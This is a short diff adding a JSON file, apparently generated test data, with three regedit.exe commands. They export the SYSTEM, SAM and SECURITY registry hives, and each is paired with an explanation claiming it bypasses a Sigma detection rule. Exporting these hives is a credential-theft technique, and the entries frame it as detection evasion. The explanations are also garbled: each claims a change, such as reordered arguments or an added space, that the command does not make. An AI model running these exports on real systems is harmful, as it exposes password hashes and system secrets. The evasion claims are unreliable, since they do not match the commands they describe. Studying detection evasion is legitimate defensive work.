@@ -1,0 +1,14 @@
+[
+  {
+    "output": "regedit.exe -E HKLM\\SYSTEM C:\\Lab\\out\\registry_export.reg",
+    "explanation": "Reordering: The command reorders the arguments to avoid the suspicious ' -E ' string, which may bypass the Sigma rule's ' -E ' detection."
+  },
+  {
+    "output": "regedit.exe -E HKLM\\SAM C:\\Lab\\out\\registry_export.reg",
+    "explanation": "Substitution: The command uses 'HKLM' instead of 'hklm' or 'HKEY_LOCAL_MACHINE' to avoid the Sigma rule's 'hklm' or 'hkey_local_machine' detection."
+  },
+  {
+    "output": "regedit.exe -E HKLM\\SECURITY C:\\Lab\\out\\registry_export.reg",
+    "explanation": "Insertion: The command inserts a space between '-E' and the key path, which may bypass the Sigma rule's ' -E ' string match."
+  }
+]
